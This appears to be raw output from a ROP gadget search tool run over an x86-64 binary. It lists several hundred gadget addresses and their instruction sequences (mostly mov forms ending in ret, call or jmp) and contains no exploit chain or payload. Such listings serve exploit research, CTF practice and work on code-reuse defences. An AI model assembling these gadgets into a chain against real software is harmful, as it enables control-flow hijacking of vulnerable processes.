0x00002aaaaabe32ef : mov rdx, qword ptr [rsp + 0x10] ; mov edi, 0x2000004 ; call rax
0x00002aaaaabe31eb : mov rdx, qword ptr [rsp + 0x10] ; mov rsi, qword ptr [rsp + 8] ; call rax
0x00002aaaaab8eb3c : mov rdx, qword ptr [rsp + 0x20] ; mov rsi, r14 ; mov rdi, r12 ; call rbx
0x00002aaaaab58d38 : mov rdx, qword ptr [rsp + 0x68] ; call rax
0x00002aaaaab5a0c8 : mov rdx, qword ptr [rsp + 0x68] ; mov rsi, r13 ; mov rdi, rbx ; call rax
0x00002aaaaabe878d : mov rdx, r12 ; call rax
0x00002aaaaab819a6 : mov rdx, r12 ; lea r9, qword ptr [rsp + 0x30] ; mov rdi, rbp ; call rbx
0x00002aaaaab816dd : mov rdx, r12 ; lea r9, qword ptr [rsp + 0x70] ; mov rdi, rbp ; call rbx
0x00002aaaaab5c042 : mov rdx, r12 ; mov rdi, r15 ; call rax
0x00002aaaaac17eed : mov rdx, r13 ; add r9, qword ptr [rbp - 0x88] ; call rax
0x00002aaaaabe8b16 : mov rdx, r13 ; call rax
0x00002aaaaab81c67 : mov rdx, r13 ; lea r9, qword ptr [rsp + 0x70] ; mov rdi, r12 ; call rbx
0x00002aaaaab81801 : mov rdx, r13 ; mov rdi, rbp ; call rbx
0x00002aaaaabc844e : mov rdx, r13 ; mov rsi, r12 ; mov rdi, rbp ; call 0xef75b
0x00002aaaaab0c340 : mov rdx, r13 ; mov rsi, r12 ; mov rdi, rbp ; call r15
0x00002aaaaac03922 : mov rdx, r13 ; mov rsi, r12 ; mov rdi, rbp ; call rax
0x00002aaaaab5d2a8 : mov rdx, r13 ; mov rsi, rbp ; call rax
0x00002aaaaab0c35b : mov rdx, r13 ; mov rsi, rbx ; mov rdi, r12 ; call r15
0x00002aaaaabe8727 : mov rdx, r14 ; call rax
0x00002aaaaab5c558 : mov rdx, r15 ; call rax
0x00002aaaaab38b63 : mov rdx, r15 ; mov rsi, qword ptr [rip + 0x35f403] ; call rax
0x00002aaaaabf12fe : mov rdx, r15 ; mov rsi, r14 ; mov rdi, r13 ; call rax
0x00002aaaaabe3b8e : mov rdx, r8 ; jmp 0x10eb9e
0x00002aaaaaba95b8 : mov rdx, r8 ; jmp 0xd45d9
0x00002aaaaabadc2b : mov rdx, r8 ; jmp 0xd8c3c
0x00002aaaaabe3883 : mov rdx, rax ; jmp 0x10e897
0x00002aaaaac091d6 : mov rdx, rax ; jmp 0x13419c
0x00002aaaaab529c3 : mov rdx, rax ; jmp 0x7d9e2
0x00002aaaaab5bc8f : mov rdx, rax ; jmp 0x86c5c
0x00002aaaaab92fb7 : mov rdx, rax ; jmp 0xbdfc2
0x00002aaaaaba4891 : mov rdx, rax ; jmp 0xcf832
0x00002aaaaabb5415 : mov rdx, rax ; jmp 0xe03b1
0x00002aaaaabb5414 : mov rdx, rax ; jmp 0xe03b2
0x00002aaaaabc445b : mov rdx, rax ; jmp 0xef495
0x00002aaaaabd290b : mov rdx, rax ; jmp 0xfd8a1
0x00002aaaaab0c8b6 : mov rdx, rbp ; call r15
0x00002aaaaaaf6852 : mov rdx, rbp ; mov rsi, qword ptr [rsp + 0x18] ; mov r9, r14 ; call rbx
0x00002aaaaab5cd86 : mov rdx, rbp ; mov rsi, r14 ; mov rdi, r13 ; call rax
0x00002aaaaabe82b6 : mov rdx, rbx ; call rax
0x00002aaaaac48986 : mov rdx, rbx ; jne 0x17397f ; pop rbx ; ret
0x00002aaaaac03814 : mov rdx, rbx ; mov rsi, r12 ; mov rdi, rbp ; call rax
0x00002aaaaab5cca7 : mov rdx, rcx ; jmp 0x87c72
0x00002aaaaab6af39 : mov rsi, qword ptr [r12] ; test rsi, rsi ; jne 0x95f56 ; jmp 0x95f10
0x00002aaaaab0df69 : mov rsi, qword ptr [r15] ; mov rdi, qword ptr [r13] ; call r14
0x00002aaaaab51c17 : mov rsi, qword ptr [r8 + rax] ; add byte ptr [rax], al ; add byte ptr [rax], al ; ret
0x00002aaaaab38b66 : mov rsi, qword ptr [rip + 0x35f403] ; call rax
0x00002aaaaab30e58 : mov rsi, qword ptr [rip + 0x367111] ; call rax
0x00002aaaaab30802 : mov rsi, qword ptr [rip + 0x367767] ; call rax
0x00002aaaaab2504a : mov rsi, qword ptr [rip + 0x372f1f] ; call rax
0x00002aaaaab223ce : mov rsi, qword ptr [rip + 0x375b9b] ; call rax
0x00002aaaaab1cf49 : mov rsi, qword ptr [rsi + 0x70] ; xor eax, eax ; ret
0x00002aaaaac21f4a : mov rsi, qword ptr [rsi] ; mov qword ptr [rdi], rsi ; mov qword ptr [rdi + rdx - 8], rcx ; ret
0x00002aaaaac00437 : mov rsi, qword ptr [rsp + 0x10] ; mov rdi, rbp ; call r14
0x00002aaaaab586e8 : mov rsi, qword ptr [rsp + 0x18] ; add rsp, 8 ; pop rbx ; pop rbp ; jmp rax
0x00002aaaaaaf6855 : mov rsi, qword ptr [rsp + 0x18] ; mov r9, r14 ; call rbx
0x00002aaaaab81ab4 : mov rsi, qword ptr [rsp + 0x18] ; mov rcx, r13 ; mov rdi, rbp ; call rbx
0x00002aaaaab0d37e : mov rsi, qword ptr [rsp + 0x18] ; mov rdi, r12 ; call r15
0x00002aaaaab81d64 : mov rsi, qword ptr [rsp + 0x18] ; mov rdi, r12 ; mov r9, r15 ; call rbx
0x00002aaaaab817fc : mov rsi, qword ptr [rsp + 0x18] ; mov rdx, r13 ; mov rdi, rbp ; call rbx
0x00002aaaaaaf906b : mov rsi, qword ptr [rsp + 0x20] ; mov rdi, qword ptr [rsp + 0x18] ; call r12
0x00002aaaaaafdab4 : mov rsi, qword ptr [rsp + 0x28] ; mov rdi, qword ptr [rsp + 0x20] ; call r14
0x00002aaaaaaf8e4b : mov rsi, qword ptr [rsp + 0x28] ; mov rdi, qword ptr [rsp + 0x20] ; call r15
0x00002aaaaab59400 : mov rsi, qword ptr [rsp + 0x28] ; mov rdi, rbp ; call rax
0x00002aaaaaaf97ff : mov rsi, qword ptr [rsp + 0x38] ; mov rdi, qword ptr [rsp + 0x30] ; call r12
0x00002aaaaaafa58a : mov rsi, qword ptr [rsp + 0x38] ; mov rdi, qword ptr [rsp + 0x30] ; call r14
0x00002aaaaaafa34a : mov rsi, qword ptr [rsp + 0x38] ; mov rdi, qword ptr [rsp + 0x30] ; call r15
0x00002aaaaaaf98b3 : mov rsi, qword ptr [rsp + 0x38] ; mov rdi, qword ptr [rsp + 0x30] ; call rbx
0x00002aaaaaafd2a9 : mov rsi, qword ptr [rsp + 0x40] ; mov rdi, qword ptr [rsp + 0x38] ; call r14
0x00002aaaaaafab52 : mov rsi, qword ptr [rsp + 0x40] ; mov rdi, qword ptr [rsp + 0x38] ; call r15
0x00002aaaaaafd042 : mov rsi, qword ptr [rsp + 0x40] ; mov rdi, qword ptr [rsp + 0x38] ; call rbx
0x00002aaaaab58a30 : mov rsi, qword ptr [rsp + 0x48] ; call rax
0x00002aaaaaafb862 : mov rsi, qword ptr [rsp + 0x48] ; mov rdi, qword ptr [rsp + 0x40] ; call rbx
0x00002aaaaab901fa : mov rsi, qword ptr [rsp + 0x48] ; mov rdi, qword ptr [rsp + 0x68] ; call r12
0x00002aaaaabe31f0 : mov rsi, qword ptr [rsp + 8] ; call rax
0x00002aaaaabf4368 : mov rsi, qword ptr [rsp + 8] ; mov rdi, r13 ; call r12
0x00002aaaaabec18b : mov rsi, r12 ; call 0x73445
0x00002aaaaab0c31a : mov rsi, r12 ; mov rdi, qword ptr [rsp + 0x20] ; call r15
0x00002aaaaab5af84 : mov rsi, r12 ; mov rdi, rax ; pop rbx ; pop rbp ; pop r12 ; jmp rcx
0x00002aaaaabc8451 : mov rsi, r12 ; mov rdi, rbp ; call 0xef758
0x00002aaaaab0c343 : mov rsi, r12 ; mov rdi, rbp ; call r15
0x00002aaaaab5d150 : mov rsi, r12 ; mov rdi, rbp ; call rax
0x00002aaaaabfee2a : mov rsi, r12 ; mov rdi, rbp ; mov rcx, r13 ; call rbx
0x00002aaaaab5c2b2 : mov rsi, r12 ; mov rdi, rbx ; call rax
0x00002aaaaabfea1e : mov rsi, r12 ; mov rdi, rbx ; mov r13, rsp ; call r15
0x00002aaaaab5ac89 : mov rsi, r12 ; pop rbp ; pop r12 ; jmp rax
0x00002aaaaab5a4ac : mov rsi, r12 ; pop rbx ; pop rbp ; pop r12 ; jmp rax
0x00002aaaaab4ba41 : mov rsi, r13 ; call 0x4d17a
0x00002aaaaab4ba40 : mov rsi, r13 ; call 0x4d17b
0x00002aaaaab5a0cd : mov rsi, r13 ; mov rdi, rbx ; call rax
0x00002aaaaabfe5f0 : mov rsi, r14 ; call 0x558b5
0x00002aaaaab5be24 : mov rsi, r14 ; call rax
0x00002aaaaab2b4aa : mov rsi, r14 ; mov rdi, qword ptr [rbp - 0x4a8] ; call rax
0x00002aaaaab8eb41 : mov rsi, r14 ; mov rdi, r12 ; call rbx
0x00002aaaaab8e9b1 : mov rsi, r14 ; mov rdi, r12 ; mov r9, r15 ; call rbx
0x00002aaaaabf1301 : mov rsi, r14 ; mov rdi, r13 ; call rax
0x00002aaaaab0c8b0 : mov rsi, r14 ; mov rdi, r13 ; mov rdx, rbp ; call r15
0x00002aaaaac104c7 : mov rsi, r14 ; mov rdi, rbp ; call r12
0x00002aaaaabfe91c : mov rsi, r14 ; mov rdi, rbx ; mov qword ptr [rsp], rcx ; call r12
0x00002aaaaab0e1a8 : mov rsi, r15 ; mov rdi, r13 ; call r14
0x00002aaaaac173ee : mov rsi, rax ; shr ecx, 3 ; rep movsq qword ptr [rdi], qword ptr [rsi] ; ret
0x00002aaaaab5d2ab : mov rsi, rbp ; call rax
0x00002aaaaabc40f2 : mov rsi, rbp ; mov rdi, rbx ; call 0x3b3c8
0x00002aaaaab91e77 : mov rsi, rbp ; mov rdi, rbx ; call 0x89168
0x00002aaaaab5cfc6 : mov rsi, rbp ; mov rdi, rbx ; call rax
0x00002aaaaab9c90b : mov rsi, rbp ; xor edx, edx ; jmp 0xc78db
0x00002aaaaab0c35e : mov rsi, rbx ; mov rdi, r12 ; call r15
0x00002aaaaac0cdec : mov rsi, rbx ; mov rdi, r15 ; call qword ptr [rax]
0x00002aaaaac0ec7a : mov rsi, rbx ; mov rdi, r15 ; call r14
0x00002aaaaab5bbf6 : mov rsi, rbx ; mov rdi, rax ; call rcx
0x00002aaaaab5aef8 : mov rsi, rbx ; mov rdi, rax ; mov rbp, rax ; call 0x8218b
0x00002aaaaac1039d : mov rsi, rbx ; mov rdi, rbp ; call rcx
0x00002aaaaab9b9e2 : mov rsi, rdi ; xor edi, edi ; call rax
0x00002aaaaac071d9 : mov rsi, rdx ; add rdi, 0x10 ; jmp rcx
0x00002aaaaabe7737 : mov rsi, rdx ; call rax
0x00002aaaaac0efa4 : mov rsi, rsp ; call qword ptr [rax]
0x00002aaaaac02b84 : mov rsi, rsp ; mov rdi, rbx ; call qword ptr [rax]
0x00002aaaaab0a2e9 : mov rsp, r8 ; mov rbp, r9 ; nop ; jmp rdx
0x00002aaaaac21f7c : mov si, word ptr [rsi] ; mov word ptr [rdi], si ; mov word ptr [rdi + rdx - 2], cx ; ret
0x00002aaaaac5cb80 : mov sil, bl ; jmp rdx
0x00002aaaaabc0960 : mov word ptr [r8 - 0x77], cs ; ret
0x00002aaaaab74005 : mov word ptr [r9 - 2], cx ; ret
0x00002aaaaac713c4 : mov word ptr [rax + rax], ss ; add byte ptr [rax + 0x6f], ch ; std ; call qword ptr [rcx]
0x00002aaaaab6375d : mov word ptr [rax + rdx - 2], cx ; ret
0x00002aaaaac112d5 : mov word ptr [rax - 0x39], cs ; ret
0x00002aaaaabc0961 : mov word ptr [rax - 0x77], cs ; ret
0x00002aaaaab7a9f0 : mov word ptr [rax], cs ; add byte ptr [rax], al ; ret
0x00002aaaaab93bce : mov word ptr [rbx + 0xc], ax ; xor eax, eax ; add rsp, 0x20 ; pop rbx ; ret
0x00002aaaaac6f5fc : mov word ptr [rbx], dr1 ; add al, byte ptr [rax] ; test byte ptr [rsi], bh ; cli ; jmp rsp
0x00002aaaaac812c4 : mov word ptr [rbx], ss ; add dword ptr [rax], eax ; or bl, bl ; call qword ptr [rdi]
0x00002aaaaac850c4 : mov word ptr [rcx + 1], ss ; add byte ptr [rax + 0x72], ch ; cmc ; jmp qword ptr [rcx]
0x00002aaaaac6f854 : mov word ptr [rcx + 2], cs ; add byte ptr [rsi], dh ; cli ; call rsp
0x00002aaaaac3d0f2 : mov word ptr [rcx + 4], dx ; ret
0x00002aaaaac3d133 : mov word ptr [rcx + 8], dx ; ret
0x00002aaaaac833c4 : mov word ptr [rcx + rax], dr0 ; add byte ptr [rax - 0x14], ch ; hlt ; jmp qword ptr [rcx]
0x00002aaaaac6d32c : mov word ptr [rcx + rax], fs ; add al, 0x21 ; cmc ; jmp rsp
0x00002aaaaac3d0c0 : mov word ptr [rcx], dx ; mov byte ptr [rcx + 2], dl ; ret
0x00002aaaaac3d0b0 : mov word ptr [rcx], dx ; ret
0x00002aaaaac6cb7c : mov word ptr [rcx], gs ; add dword ptr [rax], eax ; je 0x197bcc ; call rsp
0x00002aaaaab7b90c : mov word ptr [rdi + 0x10], cx ; lea rax, qword ptr [rdi + 0x11] ; ret
0x00002aaaaab7c75c : mov word ptr [rdi + 0x10], cx ; lea rax, qword ptr [rdi + 0x12] ; ret
0x00002aaaaab7a29c : mov word ptr [rdi + 0x10], cx ; ret
0x00002aaaaab7e1cc : mov word ptr [rdi + 0x10], cx ; xor ch, ch ; mov byte ptr [rdi + 0x12], ch ; ret
0x00002aaaaab7ba14 : mov word ptr [rdi + 0x18], cx ; lea rax, qword ptr [rdi + 0x19] ; ret
0x00002aaaaab7c864 : mov word ptr [rdi + 0x18], cx ; lea rax, qword ptr [rdi + 0x1a] ; ret
0x00002aaaaab7a384 : mov word ptr [rdi + 0x18], cx ; ret
0x00002aaaaab7e2d4 : mov word ptr [rdi + 0x18], cx ; xor ch, ch ; mov byte ptr [rdi + 0x1a], ch ; ret
0x00002aaaaac2fca7 : mov word ptr [rdi + 1], dx ; mov word ptr [rdi], cx ; ret
0x00002aaaaac86ec4 : mov word ptr [rdi + 1], gs ; add al, bh ; sbb cl, bh ; jmp qword ptr [rsi]
0x00002aaaaab10372 : mov word ptr [rdi + 2], dx ; ret
0x00002aaaaab1036c : mov word ptr [rdi + 4], ax ; xor eax, eax ; mov word ptr [rdi + 2], dx ; ret
0x00002aaaaab72ef2 : mov word ptr [rdi + 4], dx ; lea rax, qword ptr [rdi + 5] ; ret
0x00002aaaaab7c608 : mov word ptr [rdi + 4], dx ; lea rax, qword ptr [rdi + 6] ; ret
0x00002aaaaab72e62 : mov word ptr [rdi + 4], dx ; mov rax, rdi ; mov byte ptr [rdi + 6], 0 ; ret
0x00002aaaaab72df2 : mov word ptr [rdi + 4], dx ; mov rax, rdi ; ret
0x00002aaaaab7a1d8 : mov word ptr [rdi + 4], dx ; ret
0x00002aaaaab7e078 : mov word ptr [rdi + 4], dx ; xor ch, ch ; mov byte ptr [rdi + 6], ch ; ret
0x00002aaaaab7c66a : mov word ptr [rdi + 8], dx ; lea rax, qword ptr [rdi + 0xa] ; ret
0x00002aaaaab7b82a : mov word ptr [rdi + 8], dx ; lea rax, qword ptr [rdi + 9] ; ret
0x00002aaaaab7a21a : mov word ptr [rdi + 8], dx ; ret
0x00002aaaaab7e0da : mov word ptr [rdi + 8], dx ; xor ch, ch ; mov byte ptr [rdi + 0xa], ch ; ret
0x00002aaaaac21f82 : mov word ptr [rdi + rdx - 2], cx ; ret
0x00002aaaaac273cc : mov word ptr [rdi - 2], cx ; ret
0x00002aaaaac271e4 : mov word ptr [rdi - 2], dx ; ret
0x00002aaaaac273c8 : mov word ptr [rdi - 3], dx ; mov word ptr [rdi - 2], cx ; ret
0x00002aaaaab7b7a3 : mov word ptr [rdi], cx ; mov byte ptr [rdi + 2], dh ; lea rax, qword ptr [rdi + 2] ; ret
0x00002aaaaab7a1a3 : mov word ptr [rdi], cx ; mov byte ptr [rdi + 2], dh ; ret
0x00002aaaaab7c5c6 : mov word ptr [rdi], cx ; mov byte ptr [rdi + 2], dl ; lea rax, qword ptr [rdi + 3] ; ret
0x00002aaaaab7ae76 : mov word ptr [rdi], cx ; mov byte ptr [rdi + 2], dl ; ret
0x00002aaaaab7e036 : mov word ptr [rdi], cx ; mov byte ptr [rdi + 2], dl ; xor ch, ch ; mov byte ptr [rdi + 3], ch ; ret
0x00002aaaaab7ea52 : mov word ptr [rdi], cx ; mov word ptr [rsi - 2], cx ; ret
0x00002aaaaac2fcab : mov word ptr [rdi], cx ; ret
0x00002aaaaab7b793 : mov word ptr [rdi], dx ; lea rax, qword ptr [rdi + 1] ; ret
0x00002aaaaab7c5b3 : mov word ptr [rdi], dx ; lea rax, qword ptr [rdi + 2] ; ret
0x00002aaaaab7a193 : mov word ptr [rdi], dx ; ret
0x00002aaaaab7e023 : mov word ptr [rdi], dx ; xor ch, ch ; mov byte ptr [rdi + 2], ch ; ret
0x00002aaaaab72d70 : mov word ptr [rdi], r9w ; add rdi, 2 ; mov rax, rdi ; ret
0x00002aaaaab72eb0 : mov word ptr [rdi], si ; lea rax, qword ptr [rdi + 1] ; ret
0x00002aaaaab72ec0 : mov word ptr [rdi], si ; mov byte ptr [rdi + 2], 0 ; lea rax, qword ptr [rdi + 2] ; ret
0x00002aaaaab72e30 : mov word ptr [rdi], si ; mov byte ptr [rdi + 2], 0 ; mov rax, rdi ; ret
0x00002aaaaab72e20 : mov word ptr [rdi], si ; mov rax, rdi ; ret
0x00002aaaaab74002 : mov word ptr [rdi], si ; mov word ptr [r9 - 2], cx ; ret
0x00002aaaaac21f7f : mov word ptr [rdi], si ; mov word ptr [rdi + rdx - 2], cx ; ret
0x00002aaaaabca370 : mov word ptr [rdi], si ; xor eax, eax ; ret
0x00002aaaaac067bf : mov word ptr [rdx + 0x6c], ax ; mov eax, 1 ; ret
0x00002aaaaac3f468 : mov word ptr [rdx + 4], ax ; lea rax, qword ptr [rdx + 5] ; ret
0x00002aaaaab76f4d : mov word ptr [rdx + 4], ax ; mov rax, rdi ; ret
0x00002aaaaab76fd1 : mov word ptr [rdx + 8], ax ; mov rax, rdi ; ret
0x00002aaaaac5bcf8 : mov word ptr [rdx - 0x12], fs ; call qword ptr [rcx - 0x12]
0x00002aaaaac5bd00 : mov word ptr [rdx - 0x12], fs ; call rsp
0x00002aaaaac5bd24 : mov word ptr [rdx - 0x12], fs ; dec dword ptr [rdx + 0x628cffee] ; out dx, al ; jmp rsp
0x00002aaaaac5bd2c : mov word ptr [rdx - 0x12], fs ; jmp rsp
0x00002aaaaac3f413 : mov word ptr [rdx], ax ; lea rax, qword ptr [rdx + 1] ; ret
0x00002aaaaab76ee8 : mov word ptr [rdx], ax ; mov rax, rdi ; ret
0x00002aaaaabdddcf : mov word ptr [rdx], ax ; ret
0x00002aaaaac8fc7a : mov word ptr [rdx], cs ; ret
0x00002aaaaac7b5f3 : mov word ptr [rdx], es ; push rdx ; ret
0x00002aaaaac7b0c2 : mov word ptr [rip + 0x3068345], es ; mov byte ptr [rcx], al ; ret
0x00002aaaaabcf9b5 : mov word ptr [rsi + 0x66], dx ; xor eax, eax ; ret
0x00002aaaaab102df : mov word ptr [rsi + 0xc], ax ; xor eax, eax ; ret
0x00002aaaaab10326 : mov word ptr [rsi + 0xe], ax ; xor eax, eax ; ret
0x00002aaaaac5cbc0 : mov word ptr [rsi - 0xd], dr1 ; call qword ptr [rdi]
0x00002aaaaab7ea55 : mov word ptr [rsi - 2], cx ; ret
0x00002aaaaabca353 : mov word ptr [rsi], ax ; xor eax, eax ; ret
0x00002aaaaac7f350 : mov word ptr [rsi], es ; add dword ptr [rdi], 2 ; ret
0x00002aaaaac8fc60 : mov word ptr [rsi], es ; add dword ptr [rdi], 3 ; insb byte ptr [rdi], dx ; add dword ptr [rdx], ecx ; ret
0x00002aaaaac82778 : mov word ptr [rsi], es ; add qword ptr [r15], 3 ; popfq ; add ecx, dword ptr [rdx] ; ret
0x00002aaaaac84490 : mov word ptr [rsi], es ; add qword ptr [rdi], 2 ; cwde ; ret
0x00002aaaaab0a024 : mov word ptr [rsp - 0x10], ax ; fld xword ptr [rsp - 0x18] ; fstp xword ptr [rdi] ; ret
0x00002aaaaab0a002 : mov word ptr [rsp - 0x10], ax ; fld xword ptr [rsp - 0x18] ; ret
0x00002aaaaab0a0c4 : mov word ptr [rsp - 0x10], ax ; mov dword ptr [rdi], esi ; fld xword ptr [rsp - 0x18] ; ret
0x00002aaaaab0a1a4 : mov word ptr [rsp - 2], di ; fldcw word ptr [rsp - 2] ; ret
0x00002aaaaac21f7e : mov word ptr ss:[rdi], si ; mov word ptr [rdi + rdx - 2], cx ; ret
0x00002aaaaab5602c : movabs al, byte ptr [0x102444894c00341d] ; xor edi, edi ; call qword ptr [rax]
0x00002aaaaab0a3a6 : movabs al, byte ptr [0x148c48148000000] ; add byte ptr [rax], al ; ret
0x00002aaaaac793ae : movabs al, byte ptr [0x180e0a4e200e4c01] ; ret
0x00002aaaaac785fd : movabs al, byte ptr [0x180e6602200e4c01] ; ret
0x00002aaaaab72c2e : movabs al, byte ptr [0x1bf3e1c8841] ; add cl, ch ; ret 0xffd3
0x00002aaaaab12ed9 : movabs al, byte ptr [0x293ff08348000000] ; ret 0xfa81
0x00002aaaaab47aa3 : movabs al, byte ptr [0x30788348000000] ; je 0x72abb ; ret
0x00002aaaaac69a30 : movabs al, byte ptr [0x40fffc2960fffc27] ; sub edi, esp ; jmp qword ptr [rax]
0x00002aaaaac872aa : movabs al, byte ptr [0x41200e0a01a00320] ; ret
0x00002aaaaac59c7b : movabs al, byte ptr [0x6e6afa5694ec2e93] ; ja 0x184c14 ; ret 0x48f
0x00002aaaaac69344 : movabs al, byte ptr [0x80fffb6ef0fffb6d] ; pop rbx ; sti ; jmp qword ptr [rax]
0x00002aaaaabaf652 : movabs al, byte ptr [0x834801538d000000] ; ret
0x00002aaaaaba4e2d : movabs al, byte ptr [0x8348e18948000000] ; ret 0x480f
0x00002aaaaab3868d : movabs al, byte ptr [0x840fc08548000000] ; ret 3
0x00002aaaaab373f2 : movabs al, byte ptr [0x894810b60ffffff9] ; ret
0x00002aaaaac2ffae : movabs al, byte ptr [0x8d49931463490003] ; adc al, 0x13 ; jmp rdx
0x00002aaaaac5c6ac : movabs al, byte ptr [0x90fff229f8fff229] ; sub edx, esi ; call qword ptr [rax]
0x00002aaaaac69f94 : movabs al, byte ptr [0x90fffc5820fffc58] ; push rdi ; cld ; call qword ptr [rax]
0x00002aaaaac6a7b9 : movabs al, byte ptr [0x9f70fffc9ff0fffc] ; cld ; jmp rax
0x00002aaaaac6a975 : movabs al, byte ptr [0x9f90fffca010fffc] ; cld ; call qword ptr [rax]
0x00002aaaaac6f929 : movabs al, byte ptr [0xa074000250bcfffa] ; cli ; call rsp
0x00002aaaaac69354 : movabs al, byte ptr [0xa0fffb7620fffb74] ; ja 0x194365 ; jmp qword ptr [rax]
0x00002aaaaac6935c : movabs al, byte ptr [0xa0fffb7920fffb77] ; jp 0x19436d ; jmp qword ptr [rax]
0x00002aaaaac69364 : movabs al, byte ptr [0xa0fffb7c20fffb7a] ; jge 0x194375 ; jmp qword ptr [rax]
0x00002aaaaac6937c : movabs al, byte ptr [0xa0fffb8520fffb83] ; xchg bl, bh ; jmp qword ptr [rax]
0x00002aaaaac6a014 : movabs al, byte ptr [0xa0fffc3720fffc35] ; cmp ah, bh ; jmp qword ptr [rax]
0x00002aaaaac69fd8 : movabs al, byte ptr [0xa0fffc3820fffc36] ; cmp esp, edi ; jmp qword ptr [rax]
0x00002aaaaac6a01c : movabs al, byte ptr [0xa0fffc3a20fffc38] ; cmp edi, esp ; jmp qword ptr [rax]
0x00002aaaaac69fe0 : movabs al, byte ptr [0xa0fffc3b20fffc39] ; cmp al, 0xfc ; jmp qword ptr [rax]
0x00002aaaaac6a024 : movabs al, byte ptr [0xa0fffc3d20fffc3b] ; cld ; jmp qword ptr [rax]
0x00002aaaaac6a02c : movabs al, byte ptr [0xa0fffc4020fffc3e] ; cld ; jmp qword ptr [rax]
0x00002aaaaac69ff0 : movabs al, byte ptr [0xa0fffc4120fffc3f] ; cld ; jmp qword ptr [rax]
0x00002aaaaac6a034 : movabs al, byte ptr [0xa0fffc4320fffc41] ; cld ; jmp qword ptr [rax]
0x00002aaaaac69ff8 : movabs al, byte ptr [0xa0fffc4420fffc42] ; cld ; jmp qword ptr [rax]
0x00002aaaaac6a03c : movabs al, byte ptr [0xa0fffc4620fffc44] ; cld ; jmp qword ptr [rax]
0x00002aaaaac6a000 : movabs al, byte ptr [0xa0fffc4720fffc45] ; cld ; jmp qword ptr [rax]
0x00002aaaaac69f74 : movabs al, byte ptr [0xa0fffc5420fffc54] ; push rbx ; cld ; jmp qword ptr [rax]
0x00002aaaaac69f6c : movabs al, byte ptr [0xa0fffc5520fffc55] ; push rsp ; cld ; jmp qword ptr [rax]
0x00002aaaaac69f64 : movabs al, byte ptr [0xa0fffc5620fffc56] ; push rbp ; cld ; jmp qword ptr [rax]
0x00002aaaaac69f5c : movabs al, byte ptr [0xa0fffc5720fffc57] ; push rsi ; cld ; jmp qword ptr [rax]
0x00002aaaaac693d1 : movabs al, byte ptr [0xa1e1fffda111fffd] ; std ; jmp rcx
0x00002aaaaac693c1 : movabs al, byte ptr [0xa230fffda140fffd] ; std ; jmp qword ptr [rax]
0x00002aaaaac5c254 : movabs al, byte ptr [0xc0fff1ecb0fff1ec] ; in al, dx ; int1 ; call rax
0x00002aaaaac5c2c8 : movabs al, byte ptr [0xc0fff1eeb0fff1ee] ; out dx, al ; int1 ; call rax
0x00002aaaaac5e3f8 : movabs al, byte ptr [0xc0fff581a0fff581] ; mov dr0, ebp ; call rsi
0x00002aaaaac49c8c : movabs al, byte ptr [0xd0ffeb7290ffeb72] ; jno 0x174c8d ; jmp rax
0x00002aaaaac5c418 : movabs al, byte ptr [0xd0fff201b0fff201] ; add edx, esi ; jmp rax
0x00002aaaaac695e0 : movabs al, byte ptr [0xd1fffdb7d1fffdb5] ; mov bh, 0xfd ; call rcx
0x00002aaaaac69600 : movabs al, byte ptr [0xd1fffdb7d1fffdb6] ; mov bh, 0xfd ; call rcx
0x00002aaaaac5d9a0 : movabs al, byte ptr [0xe2fff48926fff452] ; mov esp, esi ; jmp rdx
0x00002aaaaab47fe3 : movabs al, byte ptr [0xeb407a8b48000000] ; ret
0x00002aaaaac697ec : movabs al, byte ptr [0xf0fffc0030fffc0d] ; add esp, edi ; call rax
0x00002aaaaab7126d : movabs al, byte ptr [0xfdb3949c4930f41] ; xchg eax, ebx ; ret
0x00002aaaaac693d0 : movabs al, byte ptr gs:[0xa1e1fffda111fffd] ; std ; jmp rcx
0x00002aaaaab7126c : movabs al, byte ptr gs:[0xfdb3949c4930f41] ; xchg eax, ebx ; ret
0x00002aaaaac5ec00 : movabs byte ptr [0x6bfff67b2efff67d], al ; jp 0x189c0c ; jmp rdx
0x00002aaaaac413da : movabs byte ptr [0x8348013880000002], al ; fdivr st(7) ; ret
0x00002aaaaabb7d89 : movabs byte ptr [0x840fc08545000001], al ; ret 0xfffd
0x00002aaaaac2fdd1 : movabs byte ptr [0x8d49931463490003], al ; adc al, 0x13 ; jmp rdx
0x00002aaaaac693c9 : movabs byte ptr [0xa065fffda320fffd], al ; std ; call qword ptr [rcx]
0x00002aaaaac693a9 : movabs byte ptr [0xa076fffda350fffd], al ; std ; jmp qword ptr [rdx]
0x00002aaaaac6a965 : movabs byte ptr [0xa190fffca210fffc], al ; cld ; call qword ptr [rax]
0x00002aaaaac6a334 : movabs byte ptr [0xa2fffc7a22fffc7a], al ; jns 0x195346 ; jmp qword ptr [rdx]
0x00002aaaaac6a32c : movabs byte ptr [0xa2fffc7b22fffc7b], al ; jp 0x19533e ; jmp qword ptr [rdx]
0x00002aaaaac6a324 : movabs byte ptr [0xa2fffc7c22fffc7c], al ; jnp 0x195336 ; jmp qword ptr [rdx]
0x00002aaaaac6a31c : movabs byte ptr [0xa2fffc7d22fffc7d], al ; jl 0x19532e ; jmp qword ptr [rdx]
0x00002aaaaac693dd : movabs byte ptr [0xa461fffda3e1fffd], al ; std ; jmp rcx
0x00002aaaaab38e5d : movabs dword ptr [0x4890146348001224], eax ; add eax, edx ; jmp rax
0x00002aaaaac5d928 : movabs dword ptr [0x54fff45188fff451], eax ; push rcx ; hlt ; jmp qword ptr [rdx]
0x00002aaaaab4fe59 : movabs dword ptr [0x5b28c48348000000], eax ; pop rbp ; ret
0x00002aaaaabab73b : movabs dword ptr [0x5bffffff73820fc8], eax ; ret
0x00002aaaaac2ff2d : movabs dword ptr [0x8d49931463490003], eax ; adc al, 0x13 ; jmp rdx
0x00002aaaaac693cd : movabs dword ptr [0xa111fffda065fffd], eax ; std ; jmp rcx
0x00002aaaaac6a95d : movabs dword ptr [0xa290fffca310fffc], eax ; cld ; call qword ptr [rax]
0x00002aaaaac694a1 : movabs dword ptr [0xa490fffda410fffd], eax ; std ; call qword ptr [rax]
0x00002aaaaaad587f : movabs eax, dword ptr [0x10c0449000e] ; ret 0x440c
0x00002aaaaac5d844 : movabs eax, dword ptr [0x22fff45022fff452] ; push rax ; hlt ; jmp qword ptr [rdx]
0x00002aaaaabe4a0b : movabs eax, dword ptr [0x8948f6894c000043] ; ret 0x3bf
0x00002aaaaabf3e0d : movabs eax, dword ptr [0x940f01ff83410000] ; ret 0xc085
0x00002aaaaac6a96d : movabs eax, dword ptr [0xa090fffca110fffc] ; cld ; call qword ptr [rax]
0x00002aaaaac693d5 : movabs eax, dword ptr [0xa2e1fffda1e1fffd] ; std ; jmp rcx
